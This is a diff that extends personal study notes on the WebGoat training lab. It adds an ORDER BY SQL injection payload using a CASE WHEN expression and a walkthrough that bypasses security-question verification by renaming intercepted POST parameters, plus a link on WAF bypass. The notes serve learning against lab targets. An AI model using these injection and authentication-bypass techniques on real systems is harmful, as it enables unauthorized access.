@@ -64,6 +64,7 @@ Identify type of request: post/get
 * http proxies: learn how to deploy proxy on zap/burpsuite
 
 ## injection flow
+https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF
 
   1. sql injection
   * data manipulation language (select, insert, update)
@@ -129,3 +130,45 @@ then submit
   tried : http://sechow.com/bricks/docs/login-1.html but failed
 
   ```
+
+  4. sql injection mitigations
+
+  ```
+  use order by
+  http://192.168.60.148:8080/WebGoat/SqlInjection/servers?column=id
+  edit query:
+  column=(case when (true) then hostname else id end)
+
+  input ip address: 192.168.6.4
+  click submit
+  ```
+
+## Authentication flows
+
+### Authentication bypasses
+https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass
+1. concept:
+usually take advantage of some flaw in the configuration or logic
+
+* hidden inputs
+* removing parameters
+* forced browsing
+
+2. practices:
+There are many ways to practice this:
+check hidden account which comment in source
+remove parameters/change parameters name
+
+```
+http://localhost:8080/WebGoat/start.mvc#lesson/AuthBypass.lesson/1
+intercept the post method
+secQuestion0=test&secQuestion1=test&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
+
+change the parameter name:
+secQuestion3=test&secQuestion4=test&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
+
+magicly it passed
+```
+
+### JWT tokens (under development)
+https://jwt.io/introduction/
